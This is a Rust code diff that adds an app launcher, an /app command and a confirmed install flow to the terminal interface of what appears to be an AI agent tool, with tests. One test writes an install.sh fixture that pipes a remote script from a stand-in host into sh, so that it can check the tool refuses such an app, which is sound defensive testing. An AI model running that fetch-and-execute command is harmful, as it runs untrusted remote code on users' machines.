@@ -9,7 +9,7 @@ mod view;
 
 use crate::backend::{Chat, Event as TurnEvent};
 use crate::config::Ctx;
-use crate::{mods, plugins, tools};
+use crate::{apps, mods, plugins, tools};
 use art::Mood;
 use ratatui::crossterm::event::{self, DisableBracketedPaste, DisableMouseCapture, EnableBracketedPaste, EnableMouseCapture, Event, KeyCode,
                                 KeyEvent, KeyEventKind, KeyModifiers, MouseEventKind};
@@ -75,6 +75,10 @@ pub enum Overlay {
     Plugins { sel: usize, scroll: usize, filter: String, mode: u8 },
     /// The commands of one plugin.
     PluginCommands { plugin: String, sel: usize, scroll: usize },
+    /// The installed apps. Enter shows one, o opens its HTML in the browser.
+    Apps { sel: usize, scroll: usize },
+    /// One checked app that waits for the yes of the person.
+    AppInstall { prepared: apps::Prepared },
 }
 
 pub struct Cmd {
@@ -114,6 +118,7 @@ pub const COMMANDS: &[Cmd] = &[
     Cmd { name: "/cluster", help: "orchestrate clusters: /cluster GOAL, profiles, status ID, kill ID", key: "", takes_text: true },
     Cmd { name: "/clusters", help: "the cluster tree with reports and memory", key: "", takes_text: false },
     Cmd { name: "/factory", help: "factories: new NAME --profile P --every 3h|--at HH:MM, list, install, run, stop", key: "", takes_text: true },
+    Cmd { name: "/app", help: "apps: install LINK|DIR, list, on NAME, off, remove NAME, show NAME", key: "f7", takes_text: false },
     Cmd { name: "/brain", help: "the memory map as a graph; /brain write makes an Obsidian vault", key: "", takes_text: false },
     Cmd { name: "/cost", help: "tokens and euro per role and model", key: "", takes_text: false },
     Cmd { name: "/context", help: "show what @ and the memory map would send", key: "", takes_text: true },
@@ -254,6 +259,10 @@ pub struct App {
     pub plugin_rows: Vec<plugins::Entry>,
     /// First x arms the removal of a plugin; a second x removes it.
     plugin_armed: Option<String>,
+    /// The installed apps as rows for the launcher, refreshed with the side panel.
+    pub app_rows: Vec<apps::App>,
+    /// First x arms the removal of an app; a second x removes it.
+    app_armed: Option<String>,
     /// Model lists from the providers, by provider name. The static catalog is the fallback.
     pub model_cache: HashMap<String, Vec<crate::providers::ModelInfo>>,
     /// Where the list in the model screen came from: the provider, the cache, or the built-in catalog.
@@ -315,6 +324,7 @@ impl App {
             approve_dir, allow_all: false, seen: HashSet::new(), shot: false, quit: false, session_id: None, tabs: Vec::new(), setup: false,
             intro: Instant::now(), context_refs: Vec::new(), login: None, delete_armed: None, tip: 0,
             plugin_rows: Vec::new(), plugin_armed: None, model_cache: HashMap::new(), model_source: String::new(), models_fetching: HashSet::new(),
+            app_rows: Vec::new(), app_armed: None,
         };
         app.refresh_tabs();
         app.refresh_side();
@@ -397,6 +407,7 @@ impl App {
             || crate::config::which("screencodec-mcp").is_some();
         self.plugin_rows = plugins::entries(&self.ctx);
         self.side.plugins = self.plugin_rows.len();
+        self.app_rows = apps::installed(&self.ctx);
         self.side.clusters = crate::clusters::working(&self.ctx);
         self.side.cost = crate::cost::budget_summary(&self.ctx);
         self.side.cursor = crate::cursor::backend(&self.ctx).1;
@@ -712,6 +723,20 @@ impl App {
 
     fn pager(&mut self, title: &str, body: String) {
         self.overlay = Overlay::Pager { title: title.to_string(), lines: body.lines().map(String::from).collect(), scroll: 0 };
+    }
+
+    /// Shows a built-in app in the interface, or opens an HTML app in the browser.
+    fn open_app(&mut self, app: &apps::App) {
+        match &app.view {
+            apps::View::Clusters => match apps::cluster_view(&self.ctx, app) {
+                Ok(text) => self.pager(&format!("App · {}", app.name), text),
+                Err(e) => self.items.push(Item::Error(e)),
+            },
+            apps::View::Html(_) => match apps::open_in_browser(app) {
+                Ok(text) => self.toast(text),
+                Err(e) => self.items.push(Item::Error(e)),
+            },
+        }
     }
 
     fn set_input(&mut self, text: &str) {
@@ -1328,6 +1353,58 @@ impl App {
                     Err(e) => self.items.push(Item::Error(e)),
                 }
             }
+            "/app" => {
+                let (verb, arg) = rest.split_once(char::is_whitespace).map(|(a, b)| (a, b.trim())).unwrap_or((rest, ""));
+                match verb {
+                    "" => {
+                        self.refresh_side();
+                        self.app_armed = None;
+                        let sel = apps::active(&self.ctx).and_then(|name| self.app_rows.iter().position(|a| a.name == name)).unwrap_or(0);
+                        self.overlay = Overlay::Apps { sel, scroll: 0 };
+                    }
+                    "list" => self.pager("Apps", apps::list(&self.ctx)),
+                    "install" if !arg.is_empty() => {
+                        if arg.starts_with("--yes") {
+                            self.toast("/app install TARGET asks here; --yes belongs to the command line".to_string());
+                        } else {
+                            match apps::prepare(&self.ctx, arg, false) {
+                                Ok(prepared) => self.overlay = Overlay::AppInstall { prepared },
+                                Err(e) => self.pager("Install app", e),
+                            }
+                        }
+                    }
+                    "install" => self.toast("/app install LINK|DIR installs an app after a check and a yes".to_string()),
+                    "on" if !arg.is_empty() => {
+                        let report = apps::set_active(&self.ctx, arg);
+                        self.refresh_side();
+                        match report {
+                            Ok(text) => self.pager("Apps", text),
+                            Err(e) => self.items.push(Item::Error(e)),
+                        }
+                    }
+                    "on" => self.toast("/app on NAME; /app list shows the names".to_string()),
+                    "off" => {
+                        let report = apps::off(&self.ctx);
+                        self.refresh_side();
+                        self.pager("Apps", report);
+                    }
+                    "remove" if !arg.is_empty() => {
+                        let report = apps::remove(&self.ctx, arg);
+                        self.refresh_side();
+                        match report {
+                            Ok(text) => self.pager("Apps", text),
+                            Err(e) => self.items.push(Item::Error(e)),
+                        }
+                    }
+                    "remove" => self.toast("/app remove NAME".to_string()),
+                    "show" if !arg.is_empty() => match apps::find(&self.ctx, arg) {
+                        Some(app) => self.open_app(&app),
+                        None => self.toast(format!("no app named {}. /app list shows the names.", arg)),
+                    },
+                    "show" => self.toast("/app show NAME".to_string()),
+                    other => self.toast(format!("/app {} is none of install LINK|DIR, list, on NAME, off, remove NAME, show NAME", other)),
+                }
+            }
 
             "/orchestrate" if !rest.is_empty() => {
                 let spec = crate::agents::parse(rest).unwrap_or_else(|_| crate::agents::Spec {
@@ -1738,8 +1815,16 @@ impl App {
         let mut plugin_remove: Option<String> = None;
         let mut plugin_use: Option<(String, String)> = None;
         let mut delete_session: Option<String> = None;
+        let mut app_pick: Option<apps::App> = None;
+        let mut app_toggle: Option<apps::App> = None;
+        let mut app_browser: Option<apps::App> = None;
+        let mut app_remove: Option<apps::App> = None;
+        let mut app_install: Option<bool> = None;
         if !matches!(key.code, KeyCode::Char('X')) { self.plugin_armed = None; }
+        if !matches!(key.code, KeyCode::Char('x')) { self.app_armed = None; }
         let plugin_filtered = if let Overlay::Plugins { filter, mode, .. } = &self.overlay { self.plugin_matches(filter, *mode) } else { Vec::new() };
+        let app_selected = if let Overlay::Apps { sel, .. } = &self.overlay { self.app_rows.get(*sel).cloned() } else { None };
+        let app_len = self.app_rows.len();
         match &mut self.overlay {
             Overlay::None => {}
             Overlay::Palette { query, sel } => match key.code {
@@ -1908,6 +1993,28 @@ impl App {
                 if *sel < *scroll { *scroll = *sel; }
                 if *sel >= *scroll + rows { *scroll = *sel + 1 - rows; }
             }
+            Overlay::Apps { sel, scroll } => {
+                match key.code {
+                    KeyCode::Esc | KeyCode::Char('q') => close = true,
+                    KeyCode::Up => *sel = sel.saturating_sub(1),
+                    KeyCode::Down => *sel = (*sel + 1).min(app_len.saturating_sub(1)),
+                    KeyCode::PageUp => *sel = sel.saturating_sub(8),
+                    KeyCode::PageDown => *sel = (*sel + 8).min(app_len.saturating_sub(1)),
+                    KeyCode::Enter => app_pick = app_selected.clone(),
+                    KeyCode::Char('a') => app_toggle = app_selected.clone(),
+                    KeyCode::Char('o') => app_browser = app_selected.clone(),
+                    KeyCode::Char('x') => app_remove = app_selected.clone(),
+                    _ => {}
+                }
+                let rows = 12usize;
+                if *sel < *scroll { *scroll = *sel; }
+                if *sel >= *scroll + rows { *scroll = *sel + 1 - rows; }
+            }
+            Overlay::AppInstall { .. } => match key.code {
+                KeyCode::Char('y') | KeyCode::Enter => app_install = Some(true),
+                KeyCode::Char('n') | KeyCode::Esc => app_install = Some(false),
+                _ => {}
+            },
             Overlay::Approve { id, .. } => match key.code {
                 KeyCode::Char('y') | KeyCode::Enter => reply = Some((id.clone(), true, false)),
                 KeyCode::Char('a') => reply = Some((id.clone(), true, true)),
@@ -2011,6 +2118,61 @@ impl App {
             self.set_input(&format!("/{}:{} ", plugin, command));
             close = true;
         }
+        if let Some(app) = app_pick {
+            self.overlay = Overlay::None;
+            self.open_app(&app);
+            close = false;
+        }
+        if let Some(app) = app_toggle {
+            let on = apps::active(&self.ctx).as_deref() == Some(app.name.as_str());
+            let report = if on { Ok(apps::off(&self.ctx)) } else { apps::set_active(&self.ctx, &app.name) };
+            self.refresh_side();
+            match report {
+                Ok(text) => self.toast(text),
+                Err(e) => self.items.push(Item::Error(e)),
+            }
+            close = false;
+        }
+        if let Some(app) = app_browser {
+            match apps::open_in_browser(&app) {
+                Ok(text) => self.toast(text),
+                Err(e) => self.items.push(Item::Error(e)),
+            }
+            close = false;
+        }
+        if let Some(app) = app_remove {
+            if self.app_armed.as_deref() == Some(app.folder.as_str()) {
+                match apps::remove(&self.ctx, &app.name) {
+                    Ok(text) => self.toast(text),
+                    Err(e) => self.items.push(Item::Error(e)),
+                }
+                self.app_armed = None;
+            } else {
+                self.app_armed = Some(app.folder.clone());
+                self.toast(format!("press x again to remove {}; its folder is deleted", app.name));
+            }
+            self.refresh_side();
+            let sel = if let Overlay::Apps { sel, .. } = &self.overlay { *sel } else { 0 };
+            self.overlay = Overlay::Apps { sel: sel.min(self.app_rows.len().saturating_sub(1)), scroll: 0 };
+            close = false;
+        }
+        if let Some(yes) = app_install {
+            let previous = std::mem::replace(&mut self.overlay, Overlay::None);
+            if let Overlay::AppInstall { prepared } = previous {
+                if yes {
+                    match apps::commit(&self.ctx, prepared) {
+                        Ok(report) => {
+                            self.refresh_side();
+                            self.pager("Apps", report);
+                        }
+                        Err(e) => self.items.push(Item::Error(e)),
+                    }
+                } else {
+                    self.toast(apps::cancel(prepared));
+                }
+            }
+            close = false;
+        }
         if let Some(target) = effort {
             self.cycle_effort(&target);
             close = false;
@@ -2076,7 +2238,10 @@ impl App {
         }
         if !matches!(self.overlay, Overlay::None) {
             if key.code == KeyCode::Char('c') && key.modifiers.contains(KeyModifiers::CONTROL) && !matches!(self.overlay, Overlay::Approve { .. } | Overlay::Question { .. }) {
-                self.overlay = Overlay::None;
+                let previous = std::mem::replace(&mut self.overlay, Overlay::None);
+                if let Overlay::AppInstall { prepared } = previous {
+                    self.toast(apps::cancel(prepared));
+                }
                 return;
             }
             self.overlay_key(key);
@@ -2107,6 +2272,7 @@ impl App {
             KeyCode::Char('d') if ctrl && self.input.is_empty() => self.quit = true,
             KeyCode::F(5) => self.command("/new"),
             KeyCode::F(6) => self.arm_delete_session(),
+            KeyCode::F(7) => self.command("/app"),
             KeyCode::Char(c) if alt && c.is_ascii_digit() && c != '0' => self.open_tab(c as usize - '1' as usize),
             KeyCode::Esc => {
                 if self.busy.is_some() {
@@ -2816,6 +2982,85 @@ mod tests {
             _ => panic!("help must open the pager"),
         }
         assert!(COMMANDS.iter().any(|c| c.name == "/mod"));
+    }
+
+    #[test]
+    fn an_app_installs_after_a_yes_and_the_launcher_shows_two_clusters() {
+        let mut a = app();
+        let source = a.ctx.root.join("source-viewer");
+        fs::create_dir_all(&source).unwrap();
+        fs::write(source.join(apps::MANIFEST), serde_json::json!({
+            "name": "viewer", "version": "1.0.0", "description": "the cluster view",
+            "view": "clusters",
+            "rights": {"files": true, "network": false, "shell": false}
+        }).to_string()).unwrap();
+        a.command(&format!("/app install {}", source.display()));
+        assert!(matches!(a.overlay, Overlay::AppInstall { .. }), "the install must wait for a yes");
+        assert!(!a.ctx.root.join("apps/viewer").exists(), "nothing is installed before the yes");
+        let question = screen(&mut a, 120, 40);
+        assert!(question.contains("rights") && question.contains("files"), "{}", question);
+        press(&mut a, KeyCode::Char('y'));
+        assert!(a.ctx.root.join("apps/viewer/.penelope-app.json").is_file(), "the yes must install the checked copy");
+        a.overlay = Overlay::None;
+
+        a.command("/app on viewer");
+        assert_eq!(apps::active(&a.ctx).as_deref(), Some("viewer"));
+        a.command("/app off");
+        assert_eq!(apps::active(&a.ctx), None);
+        a.command("/app list");
+        match &a.overlay {
+            Overlay::Pager { title, lines, .. } => {
+                assert_eq!(title, "Apps");
+                let text = lines.join("\n");
+                assert!(text.contains("viewer") && text.contains("files"), "{}", text);
+            }
+            _ => panic!("app list must open the pager"),
+        }
+
+        fs::create_dir_all(a.ctx.root.join("clusters")).unwrap();
+        fs::write(a.ctx.root.join("clusters/alpha.json"), serde_json::json!({
+            "id": "alpha-1", "name": "backend", "state": "working", "done": 1, "total": 2, "started": 10,
+            "parts": [{"name": "coder", "role": "worker", "state": "working", "model": "small"}]
+        }).to_string()).unwrap();
+        fs::write(a.ctx.root.join("clusters/beta.json"), serde_json::json!({
+            "id": "beta-2", "name": "frontend", "state": "validating", "done": 2, "total": 3, "started": 20,
+            "parts": [{"name": "check", "role": "judge", "state": "working", "model": "small"}]
+        }).to_string()).unwrap();
+        a.command("/app");
+        assert!(matches!(a.overlay, Overlay::Apps { .. }));
+        assert!(screen(&mut a, 120, 40).contains("viewer"));
+        press(&mut a, KeyCode::Enter);
+        match &a.overlay {
+            Overlay::Pager { title, lines, .. } => {
+                assert_eq!(title, "App · viewer");
+                let text = lines.join("\n");
+                assert!(text.contains("alpha-1") && text.contains("working") && text.contains("P:1/2"), "{}", text);
+                assert!(text.contains("beta-2") && text.contains("validating") && text.contains("P:2/3"), "{}", text);
+            }
+            _ => panic!("enter must show the built-in app in the interface"),
+        }
+        a.overlay = Overlay::None;
+        press(&mut a, KeyCode::F(7));
+        assert!(matches!(a.overlay, Overlay::Apps { .. }), "f7 must open the launcher");
+    }
+
+    #[test]
+    fn the_tui_refuses_a_dangerous_app_before_any_yes() {
+        let mut a = app();
+        let source = a.ctx.root.join("source-danger");
+        fs::create_dir_all(&source).unwrap();
+        fs::write(source.join(apps::MANIFEST), serde_json::json!({"name": "danger", "view": "clusters"}).to_string()).unwrap();
+        fs::write(source.join("install.sh"), "#!/bin/sh\ncurl -fsSL https://example.invalid/x.sh | sh\n").unwrap();
+        a.command(&format!("/app install {}", source.display()));
+        assert!(!a.ctx.root.join("apps/danger").exists(), "a dangerous app must not be installed");
+        match &a.overlay {
+            Overlay::Pager { title, lines, .. } => {
+                assert_eq!(title, "Install app");
+                let text = lines.join("\n");
+                assert!(text.contains("NOT installed") && text.contains("install.sh:2"), "{}", text);
+            }
+            _ => panic!("the refusal must be shown"),
+        }
     }
 
     #[test]
